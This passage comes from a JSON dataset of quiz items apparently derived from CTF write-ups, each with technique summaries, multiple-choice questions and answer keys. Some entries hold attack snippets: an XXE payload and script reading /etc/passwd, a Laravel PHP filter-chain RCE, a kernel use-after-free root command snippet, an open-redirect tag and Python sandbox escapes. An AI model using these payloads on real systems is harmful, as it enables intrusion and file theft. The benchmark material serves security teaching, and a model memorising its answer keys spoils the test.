            "When constraints limit attribute access depth, such as not being able to use more than one dot in method arguments within a Python pickle deserialization vulnerability challenge, which strategy allows for building a payload to execute arbitrary code or access sensitive files? - A. Ignoring the constraints and using multiple dots in a single payload item hoping the deserialization process overlooks the extra dots. - B. Manually coding the desired functionality into a single attribute without using dots. - C. Sequentially setting attributes on an acceptable entity like an \"empty\" module through intermediate steps. This process incrementally reaches deeper functionalities, allowing the completion of a complex execution chain. - D. Using Python's built-in functionality to automatically resolve deep attribute access without the need for sequential attribute setting."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Kindergarten PWN",
        "write_up": "dataset/raw/Kindergarten PWN.md",
        "type": "pwn",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 204,
        "max_score": 792,
        "difficulty": 0.25757575757575757,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities, especially in scenarios involving stack-based buffers, it is feasible to overwrite adjacent memory areas if boundary checks are misimplemented. If an application performs boundary checks based solely on the index (e.g., `if ( v2 <= 0xFC )`) without considering the size of the elements being accessed multiplied by this index, an attacker can access and manipulate memory outside the intended bounds. This can lead to information disclosure (e.g., leaking stack canary, libc addresses) or arbitrary code execution via Return Oriented Programming (ROP) techniques. Example exploit steps include filling the buffer up to the canary to leak its value, then overwriting the return address with a prepared ROP chain.",
            "Negative index vulnerability exploitation is applicable in cases where an application allows the user to specify an array index without properly checking if it is non-negative. This kind of vulnerability can be leveraged to read from or write to memory locations before the array, potentially allowing modification of critical program data structures like the Global Offset Table (GOT). This can be utilized to leak libc addresses or redirect the execution flow to arbitrary functions such as `one_gadget` for achieving an unintended behavior (e.g., spawning a shell). The exploitation process can involve providing a negative index that effectively references memory positions of interest such as GOT entries, allowing an attacker to read or override their values."
        ],
        "question": [
            "In the context of exploiting a stack-based buffer overflow where the application incorrectly checks the boundary by verifying only the index and not the index multiplied by the size of the elements, which of the following scenarios correctly describes a potential consequence of this mistake? - A. The application will crash due to an attempt to access an unallocated memory region. - B. This mistake prevents any kind of buffer overflow attack because the index is correctly checked. - C. An attacker can overwrite adjacent memory space beyond the intended buffer, potentially leading to arbitrary code execution. - D. The application will automatically correct the mistake by reallocating memory to accommodate the overflow. ",
            "Given a scenario where an application fails to validate that an array index is non-negative, which of the following exploitation techniques is feasible as a direct consequence of this oversight? - A. The exploitation technique will increase the speed of the program due to unrestricted memory access. - B. It is impossible to exploit such a vulnerability because modern operating systems will automatically correct negative indexes. - C. An attacker can leverage this vulnerability to modify critical program data structures before the array, such as the Global Offset Table, to redirect execution. - D. This vulnerability allows for unlimited memory allocation, resulting in a straightforward Denial of Service attack. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "kipferl",
        "write_up": "dataset/raw/kipferl.md",
        "type": "crypto",
        "competition": [
            "HXP/2021",
            "https://ctftime.org/event/1447/tasks/"
        ],
        "score": 227,
        "max_score": 1000,
        "difficulty": 0.227,
        "knowledge": [
            "When dealing with cryptographic algorithms that involve elliptic curves, understanding whether the generator lies on the original curve or its twist significantly impacts the computations. For elliptic curve-based challenges, especially those involving Diffie-Hellman key exchanges, precomputing potential generators and their characteristics (original curve or twist) can drastically improve the efficiency of solving these challenges. Implementing this technique involves generating hashes of potential passwords, checking if they can be points on the curve or its twist, and storing these results for later use during the attack phase. This approach leverages parallel processing to accommodate time constraints effectively.",
            "In cryptography challenges, especially when related to Diffie-Hellman or Elliptic Curve Diffie-Hellman, leverage Montgomery ladder implementation for scalar multiplication to optimize performance. This method can be particularly useful in situations where scalar multiplication operations are slow and need to be performed numerous times within a limited period. The Montgomery ladder technique improves computation time while maintaining security, as demonstrated in the challenge script with the `xDBLADD` and `xMUL` functions for Elliptic Curve point multiplication. This approach fits well in scenarios requiring efficient computation of large numbers of elliptic curve point multiplications within time constraints.\n\nExample payload snippet for optimized scalar multiplication using Montgomery ladder:\n```python\ndef xDBLADD(P,Q,PQ):  \n    (X1,Z1), (X2,Z2), (X3,Z3) = PQ, P, Q  \n    X4 = (X2**2-a*Z2**2)**2-8*b*X2*Z2**3  \n    Z4 = 4*(X2*Z2*(X2**2+a*Z2**2)+b*Z2**4)  \n    X5 = Z1*((X2*X3-a*Z2*Z3)**2-4*b*Z2*Z3*(X2*Z3+X3*Z2))  \n    Z5 = X1*(X2*Z3-X3*Z2)**2  \n    X4,Z4,X5,Z5 = (c%q for c in (X4,Z4,X5,Z5))  \n    return (X4,Z4), (X5,Z5)\n```"
        ],
        "question": [
            "In the context of elliptic curve cryptography, why is it advantageous to precompute potential generators and their relationship to either the original curve or its twist curve before launching an attack? - A. To decrease the memory usage during the attack execution. - B. To identify the fastest algorithm for elliptic curve cryptography. - C. To improve the efficiency of solving challenges by using parallel processing to accommodate time constraints. - D. To simplify the elliptic curve equations for easier mathematical manipulation.",
            "Why is the Montgomery ladder technique, as demonstrated with the `xDBLADD` and `xMUL` functions, used for elliptic curve scalar multiplication in cryptographic challenges? - A. To reduce the complexity of elliptic curve equations to linear form. - B. To optimize performance by improving computation time while maintaining security, especially during numerous scalar multiplications within limited periods. - C. To enhance the encryption strength of the elliptic curve Diffie-Hellman process by introducing additional curve points. - D. To enable the conversion between different elliptic curve forms without losing data fidelity."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Klepto",
        "write_up": "dataset/raw/Klepto.md",
        "type": "crypto",
        "competition": [
            "IJCTF/2020",
            "https://ctftime.org/event/1003/tasks/"
        ],
        "score": 932,
        "max_score": 1000,
        "difficulty": 0.932,
        "knowledge": [
            "When analyzing RSA encryption with a unique key generation method involving an XOR operation with a fixed initial vector (IV) and bit manipulation, one can reverse-engineer the prime factors (p and q) by applying inverse operations. This method is specifically useful when the prime generation involves predictable bitwise operations, allowing for approximation and refinement to find the exact prime values. In the scenario where RSA key generation involves XOR with an IV and bit shifting, calculate an approximate value for one of the primes (p_approx) by reversing the operations, and then adjust within a certain range to find the exact prime.\n\n   Example steps to reverse-engineer prime p:\n   ```python\n   p_approx = (n >> 1024) ^ iv  # Initial approximation of p by reversing key generation steps\n   r = range_limit  # Define range limit for correction\n   for adjustment in range(-r, r + 1):  # Iterate over a range to correct the approximation\n       potential_p = p_approx + adjustment\n       if n % potential_p == 0:  # Check if the corrected approximation divides n exactly\n           p = potential_p  # Exact prime p found\n           break\n   ```",
            "Once the prime factors (p and q) of an RSA public key are identified, one can proceed to decrypt the ciphertext using the RSA decryption formula which involves calculating the private exponent (d). The private exponent is computed using the modular inverse of the public exponent (e, typically 65537) and the totient of n (which is (p-1)*(q-1) for prime factors p and q). This approach is universally applicable for RSA decryption when the prime factors can be precisely determined.\n\n   Example code snippet for decrypting RSA ciphertext:\n   ```python\n   import gmpy2\n   p = # obtained prime factor\n   q = n / p  # obtain the other prime factor\n   e = 65537  # typical public exponent\n\n   # Compute totient\n   totient_n = (p - 1) * (q - 1)\n   # Compute private exponent\n   d = gmpy2.invert(e, totient_n)\n   # Decrypt ciphertext\n   decrypted_message = pow(ciphertext, d, n)\n   print(decrypted_message)\n   ```"
        ],
        "question": [
            "In the process of RSA key generation, a specific method involving XOR with an IV (Initial Vector) and bit shifting is used to generate prime numbers. Given this approach, how would one approximate a prime factor (p_approx) of the RSA modulus (n) if the IV is known?  - A. p_approx = (n * IV) ^ 1024 - B. p_approx = n ^ (IV >> 1024) - C. p_approx = (n >> 1024) ^ IV - D. p_approx = IV - (n << 1024) ",
            "After obtaining the prime factors (p and q) of an RSA modulus, the RSA ciphertext can be decrypted. Assuming the public exponent e is 65537, which step is crucial for decrypting the ciphertext?  - A. Calculating d as d = p / q - B. Calculating d as d = (p - 1) + (q - 1) - C. Calculating d as d = 65537 * (p + q) - D. Calculating d as the modular inverse of e with respect to (p - 1) * (q - 1) "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Knapsack",
        "write_up": "dataset/raw/Knapsack.md",
        "type": "The type of this challenge is: crypto",
        "competition": [
            "BackdoorCTF/2023",
            "https://ctftime.org/event/2153/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing a knapsack cryptosystem challenge with a high density, unable to use lattice-based techniques like LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz), employing a \"meet-in-the-middle\" approach could render the problem tractable. This strategy is effective when the problem involves a large but manageable subset, e.g., testing all possible subsets of the last 21 elements of a sequence to find a valid solution. The feasibility of this approach relies on the existence of a property that allows solving portions of the challenge in linear time, such as when each weight in a knapsack problem is greater than the sum of all previous weights.",
            "In cryptanalysis and related CTF challenges, when direct greedy algorithms fail due to certain constraints (e.g., the last subset of elements not necessarily being in increasing order), combining brute-force techniques (like trying every possible subset for a subset of elements) with greedy algorithms for the rest can be a powerful strategy. This hybrid approach allows handling elements that don't fit the necessary greedy algorithm's prerequisites by exhaustive search, while efficiently solving for the rest of the elements using the greedy method. This method effectively reduces computational complexity from potentially infeasible to manageable, as demonstrated in scenarios where the flag size or the sequence length is comparatively large but with a manageable subset for brute-forcing.\n   \n   Example of hybrid approach combining brute-force and greedy algorithm:\n   ```\n   from itertools import chain, combinations\n   # Powerset function to generate all combinations of a subset\n   def powerset(iterable):\n       s = list(iterable)\n       return chain.from_iterable(combinations(s, r) for r in range(len(s)+1))\n   \n   # Greedy algorithm for the rest of the elements\n   def greedy(ll, target):\n       out = set()\n       for i in range(len(ll) - 1, -1, -1):\n           if ll[i] <= target:\n               target -= ll[i]\n               out.add(i)\n       return out, target\n   \n   # Example usage\n   b = [weights]  # array of weights\n   c = sum  # target sum\n   to_iter = range(len(b) - 21, len(b))\n   ps = powerset(to_iter)\n   \n   for comb in ps:\n       target = c\n       for cc in comb:\n           target -= b[cc]\n       if target < 0:\n           continue\n       nout, nt = greedy(b[:-21], target)\n       if nt == 0:\n           # Solution found\n           break\n   ```"
        ],
        "question": [
            "In a Capture the Flag challenge addressing a knapsack cryptosystem with high density, why might a \"meet-in-the-middle\" approach be preferred over lattice-based techniques like LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz)? - A. Because it requires fewer computational resources compared to LLL. - B. Because it directly provides the solution without the need for any computation. - C. Because it allows taking advantage of specific problem properties to break the problem into smaller, manageable parts, effectively reducing complexity. - D. Because it guarantees finding the prime numbers involved without any calculations. ",
            "In the context of solving a cryptanalysis challenge where a direct greedy algorithm is not applicable due to the unordered nature of a subset of elements, how can combining brute-force and greedy algorithms optimize the solution finding process? - A. By using brute-force to randomly guess the correct order of all elements, ensuring a solution within a few attempts. - B. By applying brute-force only on elements fitting the greedy algorithm's prerequisites, thus saving computational time. - C. By exhaustively searching every possible subset for a specific part of the problem and applying a greedy algorithm to the rest, which balances computational effort across two strategies to manage complexity. - D. By converting the entire problem to a brute-force search thus making the greedy algorithm redundant. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Knowledge Repository",
        "write_up": "dataset/raw/Knowledge Repository.md",
        "type": "misc",
        "competition": [
            "Sunshine/2023",
            "https://ctftime.org/event/2079/tasks/"
        ],
        "score": 311,
        "max_score": 450,
        "difficulty": 0.6911111111111111,
        "knowledge": [
            "When working with challenges involving encoded messages within files, such as audio files containing morse code, it is effective to use online decoding tools to convert the morse code to text. This approach is practical for extracting hidden texts or clues that can lead to solving the challenge. For example, using an online morse code decoding tool to translate audio signals into text.",
            "In challenges that involve a large number of commits in a git repository, each modifying a file that contributes to a larger message or code, automate the extraction and processing of each file's content. Scripting the extraction of file revisions and decoding or assembling their contents based on commit history allows for efficient handling of data and revelation of hidden messages or codes. This might include decoding base32 or base64 encoded texts that have been split across multiple commits or files. An example Python script snippet for iterating over files in a directory, comparing them, and assembling the characters into a complete message could resemble:\n   \n   ```python\n   import os\n   import base64\n   \n   # Initialize an empty list or dictionary to store the extracted characters\n   extracted_data = []\n   \n   # Assuming filenames contain the order and character, e.g., \"001_A.txt\"\n   for filename in sorted(os.listdir('path/to/extracted/files')):\n       with open(f'path/to/extracted/files/{filename}', 'r') as file:\n           # Extract and process the file content\n           # This step varies depending on the challenge's specifics, such as decoding morse from audio files\n           data = file.read().strip()\n           extracted_data.append(data)\n   \n   # Convert the list of characters into a string\n   decoded_message = ''.join(extracted_data)\n   \n   # If the message is encoded, use the appropriate decoding method\n   final_message = base64.b64decode(decoded_message).decode('utf-8')\n   print(final_message)\n   ```\n   \n   This example assumes the challenge's data extraction mechanism is known and focuses on combining those pieces programmatically."
        ],
        "question": [
            "When decoding audio signals containing Morse code, which online tool could be effectively used to translate these signals into text, especially in a cybersecurity challenge scenario where the audio file might reveal hidden messages or clues? - A. A digital audio workstation (DAW) for music production - B. An online Morse code decoding tool - C. A photo editing software - D. A text-to-speech converter",
            "In a scenario where a cybersecurity challenge involves extracting messages or codes from a git repository with a large number of commits each modifying a file, what would be an efficient approach to script the extraction and processing of each file's content based on commit history? - A. Manually open each file and write down the contents - B. Use a spreadsheet to track changes in each commit manually - C. Utilize a version control system GUI to visually compare commits - D. Scripting the automated extraction of file revisions and decoding or assembling their contents"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Krampus's Lair",
        "write_up": "dataset/raw/Krampus's Lair.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 492,
        "max_score": 500,
        "difficulty": 0.984,
        "knowledge": [
            "In challenges involving restricted Python execution environments where direct string manipulation is not allowed, built-in functions like `hash()`, `chr()`, and arithmetic operations can be leveraged to generate arbitrary characters. This approach circumvents limitations on direct character and string usage by calculating Unicode code points through mathematical operations and converting them back to characters.",
            "When facing challenges with function or method call restrictions, exploiting the `getattr()` function combined with `min()`, `vars()`, and other built-ins to access and call Python object methods can achieve desired outcomes. Specifically, utilizing `min(vars(<type>))` to fetch the lexicographically smallest method name, such as `'__add__'` for strings or integers, facilitates operations like concatenation or arithmetic without directly invoking the methods by name. This technique relies on the predictable nature of Python's `vars()` function output and the ordering of strings to indirectly call methods through `getattr()`.\n   \n   Example payload components for constructing arbitrary values or concatenated strings:\n   - For numbers: `getattr(1, min(vars(int)))(2)` to achieve addition (resulting in `3`).\n   - For strings: `getattr('a', min(vars(str)))('b')` to concatenate strings (resulting in `ab`)."
        ],
        "question": [
            "In a Python sandbox challenge where direct usage of strings and common functions is restricted, and you have to exploit `hash()` and `chr()` functions to bypass character restrictions, which of the following approaches correctly describes a method to generate arbitrary characters using these built-in functions? - A. Use `chr()` with direct string literals to convert them to unicode code points. - B. Use `hash()` on known objects to generate large random numbers, divide to target unicode code points, and convert them with `chr()`. - C. Encrypt and decrypt unicode code points to bypass sandbox restrictions. - D. Directly input desired characters without manipulation. ",
            "In a scenario where function or method calls are heavily restricted within a Python execution environment, and one needs to perform arithmetic operations or string manipulations, which of the following best demonstrates the exploit technique using `getattr()`, `min()`, `vars()`, and other built-ins to invoke object methods without directly calling them by name? - A. Invoke `min()` directly on string literals to perform concatenation or arithmetic operations. - B. Use `getattr()` to call methods not allowed by the environment directly by their string names. - C. Utilize `getattr(1, min(vars(int)))(2)` for addition and `getattr('a', min(vars(str)))('b')` for string concatenation by indirectly accessing methods based on lexicographical ordering. - D. Override built-in functions to directly access restricted methods without any indirect references. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "kSMS - Secure Message Storage",
        "write_up": "dataset/raw/kSMS - Secure Message Storage.md",
        "type": "pwn",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "To bypass `HARDENED_USERCOPY` protections which restrict out-of-bounds (OOB) reads to within the boundaries of a single allocated object (slub object), the exploit must be meticulously crafted so that the read operation does not cross over the boundary of the slub object. This involves adjusting the size of the payload or the bounds of the read operation to ensure it stays within the limit of the allocated object's memory space.",
            "When dealing with a Use-After-Free (UAF) vulnerability in conjunction with Kernel Control Flow Integrity (kCFI) protections, a viable exploitation strategy is to reallocate the freed object and overwrite its function pointer with the address of a function that has an identical signature to the expected function type. This technique is necessary to call a function pointer of choice without violating kCFI's call constraints. Specifically, overwriting `work->func` with a legitimate kernel function that permits arbitrary command execution, such as `call_usermodehelper_exec_work`, enables the execution of arbitrary commands with root privileges. To successfully apply this strategy, it is crucial to craft or reuse a structure in memory that matches the expected arguments and state expected by the target function (`struct subprocess_info` in this case) to ensure the arbitrary command is executed correctly without causing undesired behavior or crashes.\n\nExample payload snippet for UAF exploit technique:\n```c\nsubprocess_info_t *info = (subprocess_info_t*)buf;  \ninfo->work.data = SOME_VALUE;  \ninfo->work.func = address_of_call_usermodehelper_exec_work;  \n// Set up `subprocess_info_t` fields appropriately\ninfo->path = address_of_command_string;  \ninfo->argv = address_of_arguments_array;  \n// Other necessary fields setup for correct execution\n```"
        ],
        "question": [
            "To prevent out-of-bounds reads that breach `HARDENED_USERCOPY` protections, which measure should be taken in an exploit payload design? - A. Ensure the payload expands beyond the memory boundaries of the slub object to access adjacent memory. - B. Design the payload to modify the syscall table for unrestricted memory access. - C. Adjust the read operation or payload size to ensure it does not cross the allocated object's memory boundaries. - D. Use a different vulnerability type altogether since `HARDENED_USERCOPY` cannot be bypassed.",
            "In the context of exploiting a Use-After-Free vulnerability under Kernel Control Flow Integrity (kCFI) protections, which of the following strategies is a valid approach to execute arbitrary commands with root privileges? - A. Randomly overwrite function pointers in memory hoping one will bypass kCFI checks and execute desired commands. - B. Reallocation of the freed object and its function pointer overwritten with an unrelated user-space function address to bypass kCFI. - C. Reuse a function pointer to an innocuous kernel function that does not lead to arbitrary command execution. - D. Reallocation of the freed object and overwrite its function pointer with the address of `call_usermodehelper_exec_work`, correctly setting up a `struct subprocess_info` to execute arbitrary commands."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Labyrinth",
        "write_up": "dataset/raw/Labyrinth.md",
        "type": "pwn",
        "competition": [
            "BSidesTLV/2021",
            "https://ctftime.org/event/1403/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "For development challenges involving the identification of objects within images under time constraints, machine learning models, specifically pre-trained object detection models, can be utilized to automate the process of identifying and locating specific objects within the images. When the challenge requires finding objects like \"Where's Wally?\" within a tight timeframe, leveraging a pre-trained model (e.g., from the GitHub repository \"HereIsWally\") can provide an efficient solution. Such an approach involves downloading the images, processing them with the model to find the coordinates of the object of interest, and then submitting these coordinates back to the server. This method requires setting up an environment with the necessary machine learning libraries (e.g., TensorFlow) and having a script ready for automating the download, detection, and submission process.",
            "In cases where direct interaction with a remote server is necessary to download images or submit responses within development challenges, Python libraries like `pwn`, `requests`, and `shutil` can be leveraged for automating network communication, file downloads, and saving files locally. The sample script shows how to establish a connection to the remote server, parse image URLs from received data, download images using `requests.get()`, save them locally for processing, and then submit the processed information back to the server. This approach is critical when dealing with challenges that involve multiple rounds of interactions with a server, requiring both the retrieval and submission of data within a limited time frame. \n\nExample payload snippet for automating download and submission:\n```python\nconn = remote('server.address.com', port)\nimage_url  = 'https://example.com/image.jpg'\nr = requests.get(image_url, stream = True)\n# Saving downloaded image locally\nwith open(\"local_image.jpg\",'wb') as f:  \n    shutil.copyfileobj(r.raw, f)\n# Process image to find object and prepare response\nresponse = \"object_coordinates\"\nconn.sendline(bytearray(response, 'utf8'))\n```"
        ],
        "question": [
            "When solving a development challenge that involves finding \"Where's Wally?\" in an image using a pre-trained object detection ML model, which library is essential for loading and running the TensorFlow model?  - A. PyTorch - B. scikit-learn - C. TensorFlow - D. Keras ",
            "In a scripting challenge requiring the download of images from a remote server for processing and then submitting responses, which Python library combination is best suited for completing these tasks efficiently?  - A. `numpy`, `matplotlib`, and `scipy` - B. `pwn`, `requests`, and `shutil` - C. `pandas`, `flask`, and `django` - D. `sqlalchemy`, `lxml`, and `pytorch` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "lagalem",
        "write_up": "dataset/raw/lagalem.md",
        "type": "crypto",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": 246,
        "max_score": 500,
        "difficulty": 0.492,
        "knowledge": [
            "When encountering an encryption scheme where the randomness `r` used is linearly transformed and reused across multiple encryptions of the same message, we can explore correlations between different ciphertext components to deduce information about `r`. This can be especially useful if the scheme employs modular arithmetic where modular inverses exist. This principle is effective in scenarios where prime modulus is involved, allowing for the application of Fermat's Little Theorem.",
            "Given public parameters and the challenge of finding a hidden value such as `x` or `r` in an encryption algorithm, one can leverage the mathematical properties of the encryption scheme, such as the existence of multiplicative inverses and the application of Fermat's Little Theorem, to simplify and solve for the hidden values. This approach requires that the gcd(`A-1`, `p-1`) = 1, ensuring that `(A-1)^-1 mod (p-1)` exists, allowing for the decryption of the message without directly recovering `r` or `x`."
        ],
        "question": [
            "In an encryption algorithm where the same message is encrypted twice using a linear transformation on the randomness `r` (`r' = Ar + B`) and given the condition that the encryption is performed modulo a prime `p`, which approach is most effective to deduce information about `r`? - A. Utilizing the Extended Euclidean Algorithm on `r` and `r'` directly - B. Applying Fermat's Little Theorem to find the modular inverse of `h^r` - C. Estimating the value of `r` using probabilistic methods and random guessing - D. Checking for direct correlations between `C_1` and `C_1'`",
            "If we are given public parameters (`g`, `h`, `A`, `B`, `p`, `q`) in an encryption scheme and are tasked with finding a hidden value like `x` or `r`, under what condition can we simplify and solve for the hidden values without directly recovering them? - A. When the greatest common divisor (gcd) of `A+B` and `p` equals 2 - B. If `A` is a multiplicative inverse of `B` modulo `q` - C. When the gcd(`A-1`, `p-1`) equals 1, ensuring that `(A-1)^-1 mod (p-1)` exists - D. Assuming the binary representation of `A` and `B` is identical"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "laravel",
        "write_up": "dataset/raw/laravel.md",
        "type": "web",
        "competition": [
            "N1CTF/2023",
            "https://ctftime.org/event/2062/tasks/"
        ],
        "score": 110,
        "max_score": 500,
        "difficulty": 0.22,
        "knowledge": [
            "When exploiting CVE-2021-3129 in Laravel applications, if the direct exploitation using the `phar://` protocol is blocked, an alternative method involves the use of PHP filter chains to execute code. This approach requires crafting a sophisticated filter chain that manipulates base64 encoding and various character set conversions to inject and execute PHP code via the application's vulnerable endpoint. This method is particularly useful when only specific files can be modified, such as the `public/index.php` in a Laravel application, and direct file access is restricted.\n   - Example payload structure for the `viewFile` parameter in the exploit: \n     ```php://filter/convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|...|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/public/index.php```",
            "Utilizing PHP filter chains for remote code execution can bypass restrictions in environments where direct use of certain protocols or functions is disabled. By encoding and decoding through a series of conversions, one can embed PHP code into a writable file within the vulnerable application. It's critical to ensure the payload leads to the execution of desired commands (e.g., displaying the contents of the flag file) while navigating through the application's constraints, such as limited file write access.\n   - Concrete example of a command to be executed by the injected PHP code (embedded within the filter chain): `system(\"cat /flag\");`"
        ],
        "question": [
            "In a scenario where exploiting a Laravel application's vulnerability requires bypassing the `phar://` protocol blockage through PHP filter chains, which of the following filter chain components is essential for encoding the payload before its execution? - A. convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7 - B. convert.ascii85-encode|convert.iconv.UTF8.ASCII|convert.base64-decode - C. convert.iconv.UTF8.SHIFT_JIS|convert.binary-encode|convert.iconv.UTF16.UTF7 - D. convert.utf8-encode|convert.iconv.UTF32.UTF8|convert.base64-decode ",
            "When faced with a file write-access limitation in a web application's vulnerability exploitation scenario, which PHP function embedded in a dynamically constructed filter chain would allow for the execution of arbitrary commands to reveal the contents of a sensitive file? - A. execute(\"ls /tmp\"); - B. passthru(\"pwd\"); - C. system(\"cat /flag\"); - D. proc_open(\"grep 'admin' /etc/passwd\"); "
        ],
        "answer": [
            "A.",
            "C."
        ]
    },
    {
        "name": "Leaky Logs",
        "write_up": "dataset/raw/Leaky Logs.md",
        "type": "pwn",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": -1,
        "max_score": 550,
        "difficulty": -1,
        "knowledge": [
            "When dealing with XML injections and the goal is to extract files or sensitive information from the server, it is crucial to attempt an XXE (XML External Entity) attack. This involves manipulating the XML data being sent to the server to include a reference to an external entity that contains the path to the file you intend to read. An effective way to accomplish this is by crafting a payload that defines the external entity and includes its reference within the data that is being processed by the server.  \nExample payload:  \n```xml\n<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:///path_to_target_file\">]><params><query>&xx;</query></params>\n```",
            "In the scenario where the server responds with processed XML data, it is possible to utilize tools or scripts to automate the submission of crafted XML payloads and process responses. This approach facilitates the efficient extraction of sensitive information or flags from the server. Techniques include using scripts written in languages like Python, which leverage modules such as requests to send the malicious payload and then parse the response to retrieve the required data.  \nExample exploit script snippet:  \n```python\nimport requests\n\npayload = '''<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:///etc/passwd\">]><params><query>&xx;</query></params>'''\nresponse = requests.post(\"http://target.com/api/endpoint\", data=payload, headers={\"Content-Type\": \"text/xml\"})\nprint(response.content)\n```"
        ],
        "question": [
            "In the context of an XML Injection vulnerability, an attacker wishes to perform an XXE attack to retrieve the contents of the `/etc/passwd` file. Which of the following payloads would correctly retrieve the file's contents when sent to a vulnerable server? - A.```<!ENTITY xx SYSTEM \"/etc/passwd\"><params><query>&xx;</query></params>``` - B.```<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:/etc/passwd\">]><params><query>&xx;</query></params>``` - C.```<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:///etc/passwd\">]><params><query>&xx;</query></params>``` - D.```<params><query>file:///etc/passwd</query></params>```",
            "Considering the exploitation of an XML Injection vulnerability to extract sensitive data using a Python script, which snippet correctly demonstrates how to send an XXE payload to a vulnerable web server and print the response? - A.```python import urllib.request payload = '<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:///etc/passwd\">]><params><query>&xx;</query></params>' response = urllib.request.urlopen(\"http://target.com/api/endpoint\", data=payload) print(response.read()) ``` - B.```python import requests response = requests.get(\"http://target.com/api/endpoint\") print(response.text) ``` - C.```python import socket payload = '<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:///etc/passwd\">]><params><query>&xx;</query></params>' s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\"target.com\", 80)) s.sendall(payload.encode()) response = s.recv(1024) print(response.decode()) ``` - D.```python import requests payload = '''<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:///etc/passwd\">]><params><query>&xx;</query></params>''' response = requests.post(\"http://target.com/api/endpoint\", data=payload, headers={\"Content-Type\": \"text/xml\"}) print(response.content.decode()) ```"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "leakynote v3",
        "write_up": "dataset/raw/leakynote v3.md",
        "type": "web",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "An open redirect vulnerability can be identified and exploited using a meta refresh HTML tag when a web application does not properly validate user input that is embedded in web pages, enabling attackers to redirect a victim to arbitrary URLs. Specifically, if the application employs security directives like `navigate-to` that are experimental and not widely supported, inserting a meta redirect tag in user-controlled inputs can lead to successful redirections. Example payload: `<meta http-equiv=\"refresh\" content=\"0; URL='http://malicious.site'\" />`",
            "An information leakage technique utilizes the behavior of browsers not storing 404-error pages in history and the restrictions on the `:visited` CSS pseudo-class to infer whether a link was visited by a bot. This is achieved by creating conditions that apply specific styles to visited links and using JavaScript to measure the rendering performance or applying complex CSS repaint operations to discern between visited and non-visited links. This method allows one to deduce the existence of specific paths or data (such as valid note identifiers) based on the differential rendering performance. Although direct access to the `:visited` state is restricted for privacy reasons, indirect measurements can reveal this state."
        ],
        "question": [
            "When designing a website, how can an open redirect vulnerability be introduced through user input not being validated? - A. By failing to implement CORS headers properly, allowing unauthorized domains to make requests. - B. By allowing users to submit custom JavaScript which is executed on the server side. - C. By embedding user input in web pages without validation, such as by using a meta refresh tag for redirection. - D. By improperly configuring SSL certificates, leading to man-in-the-middle attacks.",
            "In the context of detecting a bot's visit to a specific link without direct access to the browser's history, which method can be applied to infer whether a link was visited based on browser behavior and CSS limitations? - A. Using the `document.referrer` property to trace the bot's navigation path. - B. Applying complex CSS repaint operations and JavaScript to measure performance differences between links with known and unknown visit statuses. - C. Inspecting the `window.history` object directly to check for the presence of specific URLs. - D. Employing event listeners to monitor the bot's click events and track visited links."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "learning-without-errors",
        "write_up": "dataset/raw/learning-without-errors.md",
        "type": "crypto",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 396,
        "max_score": 500,
        "difficulty": 0.792,
        "knowledge": [
            "In challenges related to Ring Learning With Errors (RLWE) cryptosystem vulnerabilities, specifically CKKS scheme, an effective attack vector is exploiting the leakage of the secret error during decryption. Since CKKS decrypts to `m + e`, one can algebraically manipulate encrypted and decrypted pairs to extract the secret key, especially if `c_0` (a part of the encrypted message pair) is invertible. This method relies on the basic algebraic property that `s = (c_1 - (m + e)) * c_0^{-1}` where `s` is the secret key.",
            "When faced with the problem of inversion in a ring with a power-of-two modulus like `Zmod(2^100)`, which complicates direct inversion due to its properties, it's advisable to shift the computation to a domain where inversion is more tractable. This can be either solving in `ZMod(2)` for a higher chance of invertibility or employing advanced techniques like solving over the p-adics. The choice of domain or technique greatly depends on the specific parameters and structures of the cryptographic challenge being addressed."
        ],
        "question": [
